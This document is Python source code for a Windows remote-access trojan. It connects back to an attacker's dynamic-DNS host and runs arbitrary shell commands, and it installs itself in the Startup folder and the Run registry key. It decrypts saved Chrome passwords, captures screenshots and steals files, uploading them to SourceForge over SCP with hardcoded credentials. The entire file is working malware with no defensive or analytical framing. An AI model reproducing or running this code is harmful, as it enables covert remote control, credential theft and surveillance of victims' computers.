import socket
import os
import subprocess
import time
import random
import winreg as wreg
import shutil
import sys
import paramiko
import PIL.ImageGrab
import tempfile
import shutil
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import scp

current_directory = os.getcwd()

def get_master_key():
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        return "Chrome < 80"

def save_passwords_to_file(passwords):
    with open('dump.txt', 'w') as f:
        for url, username, password in passwords:
            f.write(f"URL: {url}\nUser Name: {username}\nPassword: {password}\n")
        

def send_to_sourceforge(local_file_path, client_socket):
    try:
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect("web.sourceforge.net", username="login123", password="hacker+")
        client_socket.send(b"[+] Authenticating against web.sourceforge.net\n")
        with scp.SCPClient(ssh_client.get_transport()) as scp_client:
            scp_client.put(local_file_path)
        client_socket.send(b"[+] File uploaded successfully\n")
    except Exception as e:
        client_socket.send(f"Error occurred during file upload: {str(e)}\n".encode())
    finally:
        ssh_client.close()
        client_socket.send(b"[+] SSH connection closed\n")

def screencap(client_socket):
    try:
        client_socket.send(b"[+] Capturing screenshot...\n")
        dirpath = tempfile.mkdtemp()  # Create a temp dir to store our screenshot file
        screenshot_path = os.path.join(dirpath, "img.jpg")
        PIL.ImageGrab.grab().save(screenshot_path, "JPEG")  # Save the screencap in the temp dir
        client_socket.send(b"[+] Screenshot captured. Uploading to SourceForge...\n")
        # Send the screenshot to SourceForge
        send_to_sourceforge(screenshot_path, client_socket)
        shutil.rmtree(dirpath)  # Clean up the temp directory
    except Exception as e:
        client_socket.send(f"Error occurred: {str(e)}\n".encode())

def execute_command(command):
    global current_directory  # Access the global variable

    try:
        if command.startswith("cd"):
            _, directory = command.split(" ", 1)  # Split the command to get the directory
            os.chdir(directory.strip())  # Change the current directory
            current_directory = os.getcwd()  # Update the current directory variable
            # Send confirmation to attacker
            return b""

        elif command.startswith("echo"):
            os.chdir(current_directory)  # Use the current directory
            os.system(command)  # Execute the command directly
            return b""  # Return an empty byte string since there's no output for this command
        elif command.startswith("remove_host"):
            os.chdir(current_directory)  # Use the current directory
            ip, hostname = command.split()[1:]
            remove_host_command = 'powershell -Command "(Get-Content \'C:\\Windows\\System32\\drivers\\etc\\hosts\') | Where-Object { $_ -notmatch \'' + ip + ' ' + hostname + '\' } | Set-Content \'C:\\Windows\\System32\\drivers\\etc\\hosts\'"'
            subprocess.run(remove_host_command, shell=True, check=True)
            return b"Host removed successfully\n"
        else:
            os.chdir(current_directory)  # Use the current directory
            # Execute the command using Popen with communicate
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, _ = process.communicate()  # Get the command output
            return output
    except Exception as e:
        return f"Error occurred: {str(e)}\n".encode()

def add_to_startup():
    # Get the username of the current user
    username = os.getlogin()
    # Construct the full path to the startup folder
    startup_folder = os.path.join("C:\\Users", username, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    # Get the absolute path of the script
    file_path = os.path.abspath(__file__)

    try:
        # Add the script to the startup folder
        shutil.copy(file_path, startup_folder)
    except Exception as e:
        print("Error copying script to startup folder:", e)

    try:
        # Add the script to the Registry
        key = wreg.HKEY_CURRENT_USER
        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        wreg.CreateKey(key, key_value)
        registry_key = wreg.OpenKey(key, key_value, 0, wreg.KEY_WRITE)
        wreg.SetValueEx(registry_key, "process", 0, wreg.REG_SZ, file_path)
        wreg.CloseKey(registry_key)
    except Exception as e:
        print("Error adding to startup registry:", e)

def get_attacker_ip():
    hostname = "login22.ddns.net"  # Replace "attacker-hostname" with the actual hostname of the attacker
    try:
        ip = socket.gethostbyname(hostname)
        return ip
    except socket.gaierror:
        print("Hostname could not be resolved.")
        return None


def main():
    attacker_ip = get_attacker_ip()  # Call get_attacker_ip() to get the attacker's IP address
    if attacker_ip:
        try:
            add_to_startup()
        except Exception as e:
            print(str(e))
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((attacker_ip, 2222))  # Use attacker_ip instead of ip
            client.send(b"[+] Client is connected\n")           
            while True:
                command = client.recv(4096)
                if b"terminate" in command:
                    client.close()
                    break
                elif b"screencap" in command:
                    screencap(client)
           
                elif b"dump google" in command:
                # Dump Chrome passwords and upload dump.txt to SourceForge
                    try:
                        master_key = get_master_key()
                        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
                        shutil.copy2(login_db, "Loginvault.db")
                        conn = sqlite3.connect("Loginvault.db")
                        cursor = conn.cursor()

                        passwords = []
                        try:
                            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                            for r in cursor.fetchall():
                                url = r[0]
                                username = r[1]
                                encrypted_password = r[2]
                                decrypted_password = decrypt_password(encrypted_password, master_key)
                                if len(username) > 0:
                                    passwords.append((url, username, decrypted_password))
                        except Exception as e:
                            pass

                        cursor.close()
                        conn.close()

                        try:
                            os.remove("Loginvault.db")
                        except Exception as e:
                            pass

                        if passwords:
                            save_passwords_to_file(passwords)
                            send_to_sourceforge('dump.txt', client)
                    except Exception as e:
                        print(str(e))               
                elif b"grab" in command:
                # Split the command to get the file path to grab
                    grab_command_parts = command.split()
                    if len(grab_command_parts) == 2:
                        file_to_grab = grab_command_parts[1].decode()  # Extract the file path
                        if os.path.exists(file_to_grab) and os.path.isfile(file_to_grab):
                            try:
                                send_to_sourceforge(file_to_grab, client)
                            except Exception as e:
                                client.send(f"[-] Error uploading file: {str(e)}\n".encode())
                        else:
                            client.send(b"[-] File not found or is not a regular file\n")
                    else:
                        client.send(b"[-] Invalid command format. Use 'grab filepath'\n")
                else:
                    result = execute_command(command.decode())
                    client.send(result)
                    client.send(b"\n[+] Command execution completed\n")
        except Exception as e:
            print("Error occurred:", e)
        finally:
            time.sleep(15 * 60)  # Wait for 10 seconds before attempting to reconnect

if __name__ == "__main__":
    main()
